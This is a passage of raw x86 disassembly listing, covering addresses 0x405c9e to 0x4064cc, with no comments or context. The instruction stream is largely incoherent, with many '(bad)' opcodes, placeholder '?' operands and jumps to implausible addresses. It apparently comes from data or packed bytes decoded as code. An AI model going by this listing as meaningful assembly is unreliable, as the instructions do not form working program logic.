  405c9e:	xor    cl,BYTE PTR [eax+0x1d008515]
  405ca4:	retf   0xe1ff
  405ca7:	repnz std 
  405ca9:	push   es
  405caa:	scas   al,BYTE PTR es:[edi]
  405cab:	ja     0x405d26
  405cad:	add    cl,ch
  405caf:	xor    cl,BYTE PTR [ecx]
  405cb1:	call   FWORD PTR [ecx+ebx*4-0x79]
  405cb5:	adc    eax,0xffc9f459
  405cba:	jno    0x405cb3
  405cbc:	js     0x405c87
  405cbe:	stos   BYTE PTR es:[edi],al
  405cbf:	pop    edi
  405cc0:	xchg   esp,eax
  405cc1:	in     al,dx
  405cc2:	push   0x76
  405cc4:	nop
  405cc5:	lea    esp,[edx*1-0xe5d9827]
  405ccc:	leave  
  405ccd:	call   DWORD PTR [eax-0x690094c9]
  405cd3:	inc    edx
  405cd4:	adc    al,0xc0
  405cd6:	adc    eax,0x717d8c2b
  405cdb:	data16 (bad) 
  405cdd:	push   0x6c
  405cdf:	out    dx,eax
  405ce0:	js     0x405d32
  405ce2:	sbb    DWORD PTR [edi-0x5016ffb8],0x31c77848
  405cec:	mov    edi,0x18025e45
  405cf1:	mov    dh,0xac
  405cf3:	mov    al,ds:0xef970ed8
  405cf8:	test   DWORD PTR [eax+0x0],edx
  405cfb:	daa    
  405cfc:	loope  0x405d42
  405cfe:	cld    
  405cff:	enter  0xb609,0x45
  405d03:	arpl   WORD PTR [edx],di
  405d05:	movzx  eax,BYTE PTR [eax]
  405d08:	int    0x94
  405d0a:	push   eax
  405d0b:	movd   mm1,edi
  405d0e:	clc    
  405d0f:	push   eax
  405d10:	pop    ss
  405d11:	loope  0x405d57
  405d13:	clc    
  405d14:	mov    eax,0x1e45b709
  405d19:	cmp    cl,BYTE PTR [edi]
  405d1b:	mov    bh,0x9d
  405d1d:	sahf   
  405d1e:	push   eax
  405d1f:	call   FWORD PTR [ebp-0x66]
  405d22:	push   0xffcbb800
  405d27:	mov    WORD PTR [ebp-0x4917affa],cs
  405d2d:	dec    ebp
  405d2e:	add    BYTE PTR [eax],al
  405d30:	pop    ebx
  405d31:	push   ecx
  405d32:	xor    al,0x8d
  405d34:	or     eax,0x16e85089
  405d39:	(bad)  
  405d3a:	(bad)  
  405d3b:	dec    DWORD PTR [eax-0x78]
  405d3e:	inc    ebp
  405d3f:	mov    WORD PTR [eax+0x25],cs
  405d42:	sti    
  405d43:	dec    edi
  405d44:	dec    ecx
  405d45:	or     eax,0x9668ede8
  405d4a:	(bad)  
  405d4b:	call   0x401e8c
  405d50:	ror    DWORD PTR [edx+0x55],0x8b
  405d54:	mov    ah,0x8c
  405d56:	les    ebp,FWORD PTR [edi+eiz*4]
  405d59:	xchg   esi,eax
  405d5a:	call   DWORD PTR [ebx+0x4f]
  405d5d:	and    eax,DWORD PTR [eax]
  405d5f:	push   0x58
  405d61:	xchg   edi,eax
  405d62:	jne    0x405d6c
  405d64:	mov    al,0x8a
  405d66:	sar    edi,1
  405d68:	mov    DWORD PTR [ebx],0x6000fc45
  405d6e:	or     eax,0x96a6ef00
  405d73:	jne    0x405d7d
  405d75:	xor    eax,ecx
  405d77:	lahf   
  405d78:	shl    BYTE PTR [esi],1
  405d7a:	xlat   BYTE PTR ds:[ebx]
  405d7b:	sbb    ebx,DWORD PTR [ecx+esi*1-0x5372fc90]
  405d82:	dec    edi
  405d83:	mov    ?,edi
  405d85:	push   ds
  405d86:	mov    al,ds:0x36fd589b
  405d8b:	pop    edi
  405d8d:	mov    ah,0x8f
  405d8f:	mov    ?,edi
  405d91:	push   es
  405d92:	add    al,0x4
  405d94:	add    BYTE PTR [ecx],dh
  405d96:	in     eax,dx
  405d97:	mov    BYTE PTR [eax-0xa],ah
  405d9a:	push   ss
  405d9b:	(bad)  
  405d9c:	push   eax
  405d9d:	(bad)  
  405d9f:	dec    esi
  405da0:	add    BYTE PTR [ecx],dh
  405da2:	pop    ebx
  405da3:	mov    esp,0x50ed032b
  405da8:	je     0x405d80
  405daa:	jbe    0x405d3a
  405dac:	jmp    0x405dd0
  405dae:	lock int 0xff
  405db1:	cmp    eax,0x3101496d
  405db6:	jo     0x405dbb
  405db8:	or     esp,ebx
  405dba:	fild   DWORD PTR [edx]
  405dbc:	(bad)  
  405dbd:	ss jo  0x405e06
  405dc0:	inc    ecx
  405dc1:	mov    al,0x48
  405dc3:	add    DWORD PTR [eax],0x31
  405dc6:	jo     0x405dd9
  405dc8:	in     eax,0x2a
  405dca:	mov    al,0x17
  405dcc:	push   ss
  405dcd:	sbb    DWORD PTR [ebx+eax*1-0xacf0000],ecx
  405dd4:	xchg   DWORD PTR [eax+0x7e],esp
  405dd7:	sahf   
  405dd8:	mov    ss,WORD PTR [eax+0x76]
  405ddb:	sbb    al,0xfc
  405ddd:	out    0xad,eax
  405ddf:	lahf   
  405de0:	mov    ?,edi
  405de2:	pop    edx
  405de3:	jae    0x405dfe
  405de5:	add    bl,cl
  405de7:	outs   dx,DWORD PTR ds:[esi]
  405de8:	mov    ?,WORD PTR [ebp+0x29]
  405deb:	mov    BYTE PTR [ebp-0x30],bl
  405dee:	dec    esi
  405def:	or     BYTE PTR [esi-0x65],ah
  405df2:	je     0x405d77
  405df4:	pop    esi
  405df5:	mov    fs,ecx
  405df7:	test   esp,ebx
  405df9:	sti    
  405dfa:	dec    esi
  405dfb:	repnz cmp BYTE PTR [esi+0x7e8f22e],cl
  405e02:	xor    DWORD PTR [ecx],ecx
  405e04:	push   ecx
  405e05:	lds    eax,FWORD PTR [edx]
  405e07:	test   DWORD PTR [esi],esi
  405e09:	jl     0x405db7
  405e0b:	in     eax,0x2d
  405e0d:	mov    cs,WORD PTR [esi]
  405e0f:	repnz and eax,0x1e093102
  405e15:	pop    eax
  405e16:	pop    ebp
  405e17:	test   BYTE PTR [esi],dl
  405e19:	mov    cs,WORD PTR [ecx+0x3103f907]
  405e1f:	icebp  
  405e20:	call   0x11498f2c
  405e25:	call   0x342967c9
  405e2a:	(bad)  
  405e2b:	mov    esi,0x84ce8e8d
  405e30:	out    0x17,al
  405e32:	cmp    DWORD PTR [ecx+0x46],esi
  405e35:	mov    ah,0x0
  405e37:	mov    esi,0x328d4184
  405e3c:	or     ecx,ebp
  405e3e:	mov    esp,fs
  405e40:	in     eax,0xc5
  405e42:	lea    esp,[esi-0x610c180f]
  405e48:	test   BYTE PTR [ecx+0x4],al
  405e4b:	sub    eax,0x8d9be909
  405e50:	ret    
  405e51:	jmp    0x54c43f59
  405e56:	xor    BYTE PTR [esi-0x7c],bh
  405e59:	xchg   esi,eax
  405e5a:	(bad)  
  405e5b:	cld    
  405e5c:	adc    BYTE PTR [ecx-0x797b8132],al
  405e62:	pushf  
  405e63:	ins    BYTE PTR es:[edi],dx
  405e64:	xchg   BYTE PTR [esi-0x73],bh
  405e67:	add    DWORD PTR [eax+eax*1-0x593a504],eax
  405e6e:	sahf   
  405e6f:	mov    esp,0xb4b8e884
  405e74:	test   bh,bh
  405e76:	ins    BYTE PTR es:[edi],dx
  405e77:	mov    dh,0xe1
  405e79:	(bad)  
  405e7a:	push   esi
  405e7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e7c:	fldenv [edi+0x52]
  405e7f:	ins    BYTE PTR es:[edi],dx
  405e80:	retf   0x50ff
  405e83:	loop   0x405eed
  405e85:	(bad)  
  405e86:	ds call 0x8383:0xa436548e
  405e8e:	ins    BYTE PTR es:[edi],dx
  405e8f:	dec    ecx
  405e90:	test   bh,bh
  405e92:	es sub eax,0x6e6a44fd
  405e98:	loope  0x405e98
  405e9a:	push   ss
  405e9b:	add    BYTE PTR [esp+ebx*1-0x724e328e],ah
  405ea2:	pop    eax
  405ea3:	push   es
  405ea4:	mov    ah,0x83
  405ea6:	add    al,0xfe
  405ea8:	xchg   ecx,esp
  405eaa:	(bad)  
  405eab:	mul    BYTE PTR [ebp-0x551e8a7d]
  405eb1:	mov    ebx,0x87b5e6cf
  405eb6:	lods   eax,DWORD PTR ds:[esi]
  405eb7:	inc    ecx
  405eb8:	lods   al,BYTE PTR ds:[esi]
  405eb9:	cmp    edi,0xffffffed
  405ebc:	sbb    BYTE PTR [edi+edi*8-0x599452ac],al
  405ec3:	mov    dh,0xb5
  405ec5:	cmp    edi,0x74
  405ec8:	dec    edx
  405ec9:	test   bh,bh
  405ecb:	mov    dh,0xa5
  405ecd:	mov    ebp,0x83bdae54
  405ed2:	call   FWORD PTR [eax*4-0x52515895]
  405ed9:	sub    ebx,0xffffffe5
  405edc:	sbb    BYTE PTR [ecx],cl
  405ede:	push   0xffffffe9
  405ee0:	mov    ebp,0xc00007fd
  405ee5:	ror    esi,1
  405ee7:	(bad)  
  405ee8:	fist   WORD PTR [ebp+esi*4-0x6b20ac]
  405eef:	call   0x401884
  405ef4:	iret   
  405ef5:	ficomp DWORD PTR [ebx-0x1]
  405ef8:	fist   WORD PTR [eax+ebp*8-0x6b0543]
  405eff:	sub    eax,DWORD PTR [eax]
  405f01:	arpl   WORD PTR [esi],bx
  405f03:	inc    edi
  405f04:	push   eax
  405f05:	fld    DWORD PTR [esi]
  405f07:	call   0x46fd47
  405f0c:	mov    DWORD PTR [ebp+0x5ffffe62],eax
  405f12:	mov    DWORD PTR [ebp-0x6ab0d4],edi
  405f18:	add    BYTE PTR [esp+esi*2-0x3847cc99],ah
  405f1f:	(bad)  
  405f20:	inc    BYTE PTR [ebp+0x2ffffe62]
  405f26:	sahf   
  405f27:	mov    esp,0xb06c8bd
  405f2c:	rcl    BYTE PTR [eax+eax*4-0x74],0x95
  405f31:	mov    BYTE PTR [ebp-0x71f50001],dl
  405f37:	rol    BYTE PTR [ebx-0x3d],1
  405f3a:	mov    bl,0x75
  405f3c:	or     al,0x4d
  405f3e:	mov    BYTE PTR [eax],dh
  405f40:	(bad)  
  405f41:	jg     0x405ed1
  405f43:	push   eax
  405f44:	call   0x402fd1
  405f49:	add    ch,BYTE PTR [ecx-0x74]
  405f4c:	test   DWORD PTR [eax+0x28ffff8f],ebx
  405f52:	mov    ?,WORD PTR [ebp+0x8]
  405f55:	mov    al,ds:0x9fffcf43
  405f5a:	mov    ?,WORD PTR [ebp-0x4]
  405f5d:	xor    DWORD PTR [ebx-0x45a6f7ef],ebx
  405f63:	mov    ebx,0x2b6600ff
  405f68:	das    
  405f69:	leave  
  405f6a:	jae    0x405fd8
  405f6c:	add    edx,DWORD PTR [ebp-0x56]
  405f6f:	mov    WORD PTR [ebp-0x7504a63c],es
  405f75:	push   DWORD PTR [ebp+esi*4+0x5d3e5087]
  405f7c:	idiv   esi
  405f7e:	cld    
  405f7f:	cmp    eax,0xc831413c
  405f84:	sbb    al,0xbe
  405f86:	xor    DWORD PTR [eax-0x2],esi
  405f89:	mov    edi,0xa2ed2e
  405f8e:	xor    DWORD PTR [eax-0x3e],esi
  405f91:	inc    ebp
  405f92:	or     DWORD PTR [eax+0x3],esi
  405f95:	add    BYTE PTR [ecx],dh
  405f97:	xor    eax,DWORD PTR [ecx-0xc]
  405f9a:	(bad)  
  405f9b:	push   0x3
  405f9d:	add    BYTE PTR [ebx-0x43ffe290],cl
  405fa3:	in     al,dx
  405fa4:	xchg   edi,eax
  405fa5:	mul    esi
  405fa7:	or     dh,BYTE PTR [edx+ebp*2]
  405faa:	xor    ebp,esi
  405fac:	inc    eax
  405fad:	hlt    
  405fae:	sub    ebp,0x72c6f480
  405fb4:	mov    dl,BYTE PTR [eax-0x3a]
  405fb7:	in     al,0x8b
  405fb9:	inc    DWORD PTR [esp+eiz*2-0x65]
  405fbd:	push   esp
  405fbe:	ja     0x40602f
  405fc0:	add    ecx,DWORD PTR [ebx]
  405fc2:	jno    0x405f9f
  405fc4:	add    cl,ch
  405fc6:	int3   
  405fc7:	outs   dx,DWORD PTR ds:[esi]
  405fc8:	add    eax,DWORD PTR [eax]
  405fca:	add    BYTE PTR [edx-0x690868fc],dh
  405fd0:	mov    edx,0xef3f7404
  405fd5:	inc    edi
  405fd6:	in     al,dx
  405fd7:	jle    0x405fe1
  405fd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fda:	mov    dh,BYTE PTR [esi]
  405fdc:	std    
  405fdd:	jecxz  0x405f69
  405fdf:	in     al,dx
  405fe0:	add    BYTE PTR [edx+0x37e7d951],0x45
  405fe7:	xor    DWORD PTR [esp+ebp*2+0x7e81668f],edx
  405fee:	xor    ecx,DWORD PTR [ecx-0x39]
  405ff1:	add    esi,DWORD PTR ss:[ecx]
  405ff4:	push   cs
  405ff5:	test   eax,0x6c93c00f
  405ffa:	fwait
  405ffb:	inc    esi
  405ffc:	sbb    DWORD PTR [esi+0x33],0x925d8ba4
  406003:	cmp    DWORD PTR cs:[ecx+0x460d9c8a],0xa7d200d0
  40600e:	add    ecx,DWORD PTR [ecx]
  406010:	inc    edi
  406011:	sbb    eax,0x29150e8a
  406016:	punpcklbw mm2,DWORD PTR [edx-0x7ef96c94]
  40601d:	push   ds
  40601e:	sbb    esi,DWORD PTR [eax]
  406020:	or     DWORD PTR [esi],eax
  406022:	dec    ecx
  406023:	out    dx,al
  406024:	mul    al
  406026:	fwait
  406027:	outs   dx,BYTE PTR ds:[esi]
  406028:	dec    edi
  406029:	push   es
  40602a:	mov    dh,BYTE PTR [edx+0x920dbe]
  406030:	(bad)  
  406031:	sub    al,0x10
  406034:	cmp    eax,0x3c8ae8f3
  406039:	adc    ecx,edx
  40603b:	shr    ah,1
  40603d:	sbb    dh,0x9d
  406040:	sub    esi,ebx
  406042:	out    0x88,eax
  406044:	and    al,0x11
  406046:	rcr    esp,0x74
  406049:	add    dh,0x89
  40604c:	in     al,0x71
  40604e:	mov    dh,0x89
  406050:	xchg   esi,eax
  406051:	add    BYTE PTR [eax],0x7c
  406054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406055:	js     0x406056
  406057:	scas   al,BYTE PTR es:[edi]
  406058:	mov    eax,0x3f9107f6
  40605d:	dec    edi
  40605e:	call   FWORD PTR [esi-0x610f4958]
  406064:	mov    eax,0xa231e880
  406069:	cmp    bh,0x86
  40606c:	push   ds
  40606d:	sub    ecx,0xff80a9d1
  406073:	jbe    0x4060b3
  406075:	jge    0x40605f
  406077:	cmc    
  406078:	out    dx,eax
  406079:	or     BYTE PTR [eax],al
  40607b:	xor    BYTE PTR [edi+0x11],dh
  40607e:	add    BYTE PTR [ebp+esi*4-0x2ed27e94],dh
  406085:	ja     0x406086
  406087:	dec    esi
  406088:	sahf   
  406089:	(bad)  
  40608a:	sti    
  40608b:	cdq    
  40608c:	test   eax,0xe63e0bf5
  406091:	pop    ecx
  406092:	dec    eax
  406093:	test   al,0x0
  406095:	xor    dh,BYTE PTR [ecx+0x5b]
  406098:	ins    BYTE PTR es:[edi],dx
  406099:	sub    eax,0xf8290b09
  40609e:	test   BYTE PTR [ebx-0x18],dl
  4060a1:	xor    cl,BYTE PTR [ecx]
  4060a3:	(bad)  
  4060a4:	lods   al,BYTE PTR ds:[esi]
  4060a5:	mov    edx,0x32e90008
  4060aa:	dec    eax
  4060ab:	inc    ebp
  4060ac:	std    
  4060ad:	test   eax,0x34e90007
  4060b2:	or     DWORD PTR [edx-0x17],ebp
  4060b5:	sub    al,0x9
  4060b7:	push   0xffffffe9
  4060b9:	aas    
  4060ba:	(bad)  
  4060bb:	repz cmp DWORD PTR [esi-0x7a],eax
  4060bf:	hlt    
  4060c0:	(bad)  
  4060c1:	test   eax,0x3fd6507f
  4060c6:	cmp    edi,0x2d70b954
  4060cc:	add    BYTE PTR [ebp-0x37f4fff5],dh
  4060d2:	syscall 
  4060d4:	jmp    0x406b47
  4060d9:	lock loop 0x406123
  4060dc:	inc    ecx
  4060dd:	mov    BYTE PTR [eax+0x11a00c75],dl
  4060e3:	aam    0xff
  4060e5:	(bad)  
  4060e6:	cmp    ecx,DWORD PTR [ebx-0xc00fa30]
  4060ec:	div    DWORD PTR [edi-0x3fadaf70]
  4060f2:	and    esp,edx
  4060f4:	inc    edi
  4060f6:	add    al,BYTE PTR [ebp-0x6f40ff10]
  4060fc:	(bad)  
  4060fd:	call   0x401d0e
  406102:	bound  ecx,QWORD PTR [ebx]
  406104:	push   0xffcbe94a
  406109:	(bad)  
  40610a:	mov    ebp,0x77fff79a
  40610f:	xchg   ecx,eax
  406110:	xor    eax,0xffcbe0d2
  406115:	out    0x5c,eax
  406117:	mov    ch,0xff
  406119:	call   DWORD PTR [ecx+0x57f7e3ff]
  40611f:	xchg   ecx,eax
  406120:	push   0x0
  406122:	mov    al,ds:0xd8415135
  406127:	xchg   ecx,eax
  406128:	mov    ch,0xf0
  40612a:	aas    
  40612b:	xchg   ecx,eax
  40612c:	(bad)  
  40612d:	call   FWORD PTR [ebp-0x37beb74c]
  406133:	mov    ds:0x86c7d3a6,al
  406138:	mov    DWORD PTR [ebp-0x713c],eax
  40613e:	bound  eax,QWORD PTR ds:0xc3f95c68
  406144:	(bad)  
  406145:	(bad)  
  406146:	xor    DWORD PTR [ebp+0x4fa6f794],ebx
  40614c:	xchg   DWORD PTR ds:0x453883,esi
  406152:	mov    eax,edi
  406154:	mov    dl,0xff
  406156:	mov    gs,ecx
  406158:	sub    al,0x7e
  40615b:	scas   eax,DWORD PTR es:[edi]
  40615c:	xchg   DWORD PTR [ebx-0x70734400],eax
  406162:	push   DWORD PTR [esi+0x70]
  406165:	cmovns esi,DWORD PTR [edx+0x66f797d5]
  40616c:	pop    DWORD PTR [esp+esi*2]
  40616f:	icebp  
  406170:	repnz dec eax
  406172:	call   0xc760d5
  406177:	lds    edi,FWORD PTR [esi-0xceffe5]
  40617d:	inc    ebp
  40617e:	inc    esp
  406180:	ja     0x40611d
  406182:	repz fild WORD PTR gs:[esi-0x713c1b01]
  40618a:	jmp    DWORD PTR [esi]
  40618c:	iret   
  40618d:	adc    BYTE PTR [eax],cl
  40618f:	or     DWORD PTR [edi+0x3f16ffb8],ebp
  406195:	push   ecx
  406196:	call   0xffc798a1
  40619b:	jl     0x406205
  40619d:	fwait
  40619e:	cmp    esp,ebp
  4061a0:	es xchg edi,edi
  4061a3:	mov    esp,0xeeff8f03
  4061a8:	push   ss
  4061a9:	adc    DWORD PTR [eax],ecx
  4061ab:	(bad)  [edx-0x48]
  4061ae:	(bad)  
  4061af:	fiadd  WORD PTR [esi]
  4061b1:	push   ecx
  4061b2:	in     al,0xde
  4061b4:	jle    0x40613c
  4061b6:	call   0xffc781f7
  4061bb:	(bad)  
  4061bc:	xor    al,0x98
  4061be:	idiv   DWORD PTR [esi+0x9be608]
  4061c4:	xor    ebx,DWORD PTR [ecx-0x22]
  4061c7:	xchg   BYTE PTR [esi-0x59713e4d],ch
  4061cd:	jge    0x406190
  4061cf:	mov    gs,WORD PTR [esi+0x7d]
  4061d2:	mov    BYTE PTR [esi-0x79498724],0x8e
  4061d9:	jge    0x406217
  4061db:	cld    
  4061dc:	mov    fs,WORD PTR [ebx+0x7d7e86af]
  4061e2:	pop    esp
  4061e3:	xchg   ebx,eax
  4061e4:	jle    0x406263
  4061e6:	sahf   
  4061e7:	fwait
  4061e8:	(bad)  
  4061e9:	dec    ebp
  4061ea:	xchg   esi,eax
  4061eb:	xchg   BYTE PTR [esi-0x3d],ah
  4061ee:	nop
  4061ef:	pushf  
  4061f0:	popf   
  4061f1:	jle    0x406179
  4061f3:	xchg   BYTE PTR [esi-0xd],dl
  4061f6:	jl     0x406193
  4061f8:	dec    ebx
  4061f9:	shr    ecx,0x3
  4061fc:	js     0x406248
  4061fe:	loope  0x406203
  406200:	in     al,0x91
  406202:	push   ebp
  406203:	sub    BYTE PTR [ebp+0x7c],0xd3
  406207:	add    ebx,DWORD PTR [ebx+0x3910560a]
  40620d:	jno    0x406268
  40620f:	mov    bh,0x1e
  406211:	jge    0x406283
  406213:	inc    eax
  406214:	adc    eax,0x7033c9f2
  406219:	or     DWORD PTR [esi],esi
  40621b:	adc    BYTE PTR [ecx],bh
  40621d:	jno    0x4061e4
  40621f:	test   esi,edi
  406221:	jl     0x4061b4
  406223:	and    DWORD PTR [ecx-0x36],0x640086e8
  40622a:	adc    DWORD PTR [ecx],eax
  40622c:	cs out 0x7c,eax
  40622f:	push   cs
  406230:	sbb    edx,DWORD PTR [ebx-0x29fc5827]
  406236:	div    al
  406238:	fwait
  406239:	jnp    0x4062b6
  40623b:	add    dh,dh
  40623d:	lods   al,BYTE PTR ds:[esi]
  40623e:	icebp  
  40623f:	enter  0x7599,0x9
  406243:	call   FWORD PTR [ebp+esi*4+0x64]
  406247:	das    
  406248:	fdiv   QWORD PTR [esp+edi*2-0x35a22798]
  40624f:	dec    ebp
  406251:	cs adc eax,ebp
  406254:	or     ebp,DWORD PTR [esi-0x64ae0084]
  40625a:	fld    DWORD PTR [eax-0x17]
  40625d:	lods   eax,DWORD PTR ds:[esi]
  40625e:	test   BYTE PTR [edi],0xc1
  406261:	mov    ?,WORD PTR [ebp-0x1]
  406264:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406265:	lods   al,BYTE PTR ds:[esi]
  406266:	idiv   bl
  406268:	sahf   
  406269:	ds adc eax,ebp
  40626c:	mov    bl,0xa9
  40626e:	jl     0x40626f
  406270:	mov    al,ds:0x1c000573
  406275:	fsubr  DWORD PTR [eax+ebp*2-0x17]
  406279:	xor    ch,BYTE PTR [esi+edi*4+0x76]
  40627d:	ss or  eax,0x643af4ff
  406283:	push   edx
  406284:	pop    esp
  406285:	lods   al,BYTE PTR ds:[esi]
  406286:	jl     0x406251
  406288:	sub    ebp,DWORD PTR ds:0x62547c
  40628e:	leave  
  40628f:	xchg   DWORD PTR [ebp-0x23],edi
  406292:	xor    cl,BYTE PTR [esp+eax*4]
  406295:	or     esi,DWORD PTR [edx]
  406297:	or     DWORD PTR [eax],eax
  406299:	ds ds or eax,0x7bd8b5e8
  4062a0:	jmp    edx
  4062a2:	repnz cmc 
  4062a4:	setno  BYTE PTR [ecx+edx*8+0x40]
  4062a9:	jmp    0x14c5863
  4062ae:	fist   WORD PTR [esi-0x1]
  4062b1:	push   cs
  4062b2:	pop    edx
  4062b3:	(bad)  
  4062b4:	or     eax,DWORD PTR [eax]
  4062b6:	ret    0x6807
  4062b9:	xchg   BYTE PTR [ecx+0x6967ffc6],ch
  4062bf:	cmp    BYTE PTR [ecx+0x0],al
  4062c2:	iret   
  4062c3:	dec    edx
  4062c4:	ror    DWORD PTR [eax+0x9],1
  4062c7:	add    eax,0x84ea19e8
  4062cc:	dec    DWORD PTR [ebx]
  4062ce:	fmul   DWORD PTR [ebx]
  4062d0:	push   ds
  4062d1:	push   eax
  4062d2:	pop    eax
  4062d3:	xchg   BYTE PTR [ebp+0xc],dh
  4062d6:	cmp    cl,0xd1
  4062d9:	dec    edi
  4062db:	aaa    
  4062dc:	push   eax
  4062dd:	inc    DWORD PTR [ebp+0x7d]
  4062e0:	out    0x91,eax
  4062e2:	iret   
  4062e3:	test   bh,bh
  4062e5:	call   0x40188e
  4062ea:	shl    BYTE PTR [esi+ecx*8+0x21bfff],0x68
  4062f2:	add    dh,dl
  4062f4:	ss inc ecx
  4062f6:	add    BYTE PTR [eax-0x8],al
  4062f9:	push   eax
  4062fa:	inc    ecx
  4062fb:	pop    eax
  4062fc:	pop    ds
  4062fd:	add    al,BYTE PTR [eax]
  4062ff:	pop    eax
  406300:	xchg   eax,ebp
  406302:	loope  0x40629d
  406304:	test   bh,bh
  406306:	or     ecx,DWORD PTR [eax]
  406308:	or     al,0x1e
  40630a:	push   eax
  40630b:	call   0x704cd895
  406310:	xor    dl,dl
  406312:	jmp    FWORD PTR [edi+0x36]
  406315:	push   eax
  406316:	call   ebp
  406318:	jle    0x406301
  40631a:	pop    ecx
  40631b:	dec    edi
  40631c:	test   edi,edi
  40631e:	call   0x4017cf
  406323:	jo     0x406302
  406325:	int    0xff
  406327:	dec    edi
  406328:	and    BYTE PTR [eax],al
  40632a:	push   0x413756
  40632f:	xor    DWORD PTR [eax+0x7070514f],ecx
  406335:	test   BYTE PTR ds:0x42b903,dh
  40633b:	(bad)  
  40633d:	mov    cl,0xff
  40633f:	(bad)  
  406340:	addr16 ret 
  406342:	je     0x406363
  406344:	mov    al,ds:0x743cff33
  406349:	imul   esp,DWORD PTR [ecx],0xffffff83
  40634c:	pop    ebx
  40634d:	adc    DWORD PTR [eax+0x1],0x53
  406351:	stc    
  406352:	pop    es
  406353:	mov    DWORD PTR [eax],edx
  406355:	cmp    edi,0x0
  406358:	xchg   esi,eax
  406359:	pop    eax
  40635a:	test   ebp,0x6e6cbb8e
  406360:	ja     0x406315
  406362:	sub    DWORD PTR [edx+0x31],0xffffffc8
  406366:	mov    DWORD PTR [ecx-0x10],edx
  406369:	outs   dx,DWORD PTR ds:[esi]
  40636a:	jmp    0x40631f
  40636c:	add    BYTE PTR [ecx],dh
  40636e:	add    al,0x68
  406370:	xor    esi,DWORD PTR [eax+0x3]
  406373:	or     BYTE PTR [ecx+0x20],0x55
  406377:	call   DWORD PTR [esi+0x77]
  40637a:	inc    ebx
  40637b:	je     0x4063ac
  40637d:	and    ah,dl
  40637f:	(bad)  
  406380:	mov    esp,0x60e96b63
  406385:	jmp    0x406309
  406387:	push   eax
  406388:	loope  0x40636c
  40638a:	clc    
  40638b:	pop    es
  40638c:	sbb    eax,ebx
  40638e:	cmp    edi,0xce3ec826
  406394:	push   ds
  406395:	retf   
  406396:	imul   esi,DWORD PTR [esi],0xffffffe7
  406399:	ret    0x6882
  40639c:	xchg   edi,eax
  40639d:	mov    eax,ds:0xbd07ffc4
  4063a2:	psubsb mm5,mm1
  4063a5:	and    BYTE PTR [ebx-0x46f69e01],al
  4063ab:	and    BYTE PTR [ecx+edx*1+0x11],0x4b
  4063b0:	out    0x79,eax
  4063b2:	push   ss
  4063b3:	ins    BYTE PTR es:[edi],dx
  4063b4:	cmp    ecx,DWORD PTR [ebx+0xe]
  4063b7:	adc    esi,0xfffffff3
  4063ba:	hlt    
  4063bb:	imul   eax,DWORD PTR [eax],0x23
  4063be:	dec    ebx
  4063bf:	inc    BYTE PTR [edx+0x3e146f8]
  4063c5:	fs mov ?,ebp
  4063c8:	xchg   ch,ch
  4063ca:	je     0x40641f
  4063cc:	add    al,0x1b
  4063ce:	pop    es
  4063cf:	fdivp  st(0),st
  4063d1:	cs jno 0x4063f1
  4063d4:	dec    edi
  4063d5:	sahf   
  4063d6:	jns    0x406438
  4063d8:	enter  0xf09a,0xeb
  4063dc:	add    al,0x31
  4063de:	or     ecx,edx
  4063e0:	or     DWORD PTR [edi+0x79],esi
  4063e3:	mov    dh,0x8c
  4063e5:	hlt    
  4063e6:	add    BYTE PTR [ecx+0x8],0x30
  4063ea:	or     ecx,ebp
  4063ec:	and    ah,0x80
  4063ef:	xchg   ecx,eax
  4063f0:	test   BYTE PTR [eax+0x710ee908],ch
  4063f6:	hlt    
  4063f7:	hlt    
  4063f8:	inc    eax
  4063f9:	sub    eax,0xc603e908
  4063fe:	or     edi,DWORD PTR [esi-0x8]
  406401:	ds jns 0x406400
  406404:	or     ecx,DWORD PTR [ecx-0x70]
  406407:	outs   dx,DWORD PTR ds:[esi]
  406408:	xor    BYTE PTR [esi],0x6d
  40640b:	icebp  
  40640c:	and    BYTE PTR [ecx+esi*2+0x78f4c251],0x56
  406414:	in     eax,dx
  406415:	push   esi
  406416:	popa   
  406417:	stc    
  406418:	push   ebp
  406419:	push   ss
  40641a:	jns    0x4063b5
  40641c:	add    BYTE PTR [ecx+eax*1+0x400f151],0x79
  406424:	add    BYTE PTR [esi],dh
  406426:	or     al,0x13
  406428:	call   0xffb8c116
  40642d:	bnd jb 0x40642d
  406430:	adc    edx,DWORD PTR [ecx-0x16bf2624]
  406436:	add    dh,BYTE PTR [ecx-0x74]
  406439:	cmp    BYTE PTR [ebx-0x36f9af88],dh
  40643f:	adc    al,ch
  406441:	scas   al,BYTE PTR es:[edi]
  406442:	mov    al,0x78
  406444:	inc    DWORD PTR [ebx+0x18e16117]
  40644a:	mov    bl,0x78
  40644c:	or     ebp,DWORD PTR [ecx+0x5b681ca9]
  406452:	or     cl,0xff
  406455:	cmp    BYTE PTR ds:0xb0ced0e6,cl
  40645b:	fsin   
  40645d:	cmp    al,0x3d
  40645f:	popa   
  406460:	xor    BYTE PTR [edi-0x2a958750],bh
  406466:	or     cl,BYTE PTR [ebx-0x2f]
  406469:	scas   al,BYTE PTR es:[edi]
  40646a:	mov    al,0x4
  40646c:	rcr    BYTE PTR ds:0x3871e149,0x72
  406473:	js     0x4064c4
  406475:	add    DWORD PTR [ebx+0x7d8eff59],0xdaf17577
  40647f:	sbb    esi,edi
  406481:	jle    0x406433
  406483:	jecxz  0x406484
  406485:	add    BYTE PTR [eax],al
  406487:	cmp    al,0xd9
  406489:	inc    eax
  40648a:	jmp    0xa891fdd9
  40648f:	xor    bh,BYTE PTR [eax+0x35]
  406492:	cmp    esi,ebp
  406494:	enter  0x40ff,0x4
  406498:	dec    eax
  406499:	dec    DWORD PTR [esi-0x3]
  40649c:	jbe    0x406513
  40649e:	add    BYTE PTR [eax],al
  4064a0:	in     al,0xf0
  4064a2:	std    
  4064a3:	inc    edi
  4064a4:	mov    ch,BYTE PTR [edx+0x0]
  4064a7:	lock adc DWORD PTR [ecx+0x41],0x51906408
  4064af:	cdq    
  4064b0:	or     edi,edi
  4064b2:	xor    eax,0x40452a
  4064b7:	xor    BYTE PTR [esi],bh
  4064b9:	sar    bh,1
  4064bb:	daa    
  4064bc:	push   es
  4064bd:	shl    BYTE PTR [esi+ebp*8-0x7e],0x45
  4064c2:	hlt    
  4064c3:	(bad)  
  4064c4:	jle    0x4064b9
  4064c6:	(bad)  
  4064c7:	cmp    eax,0xc5b1e804
  4064cc:	mov    bh,bh
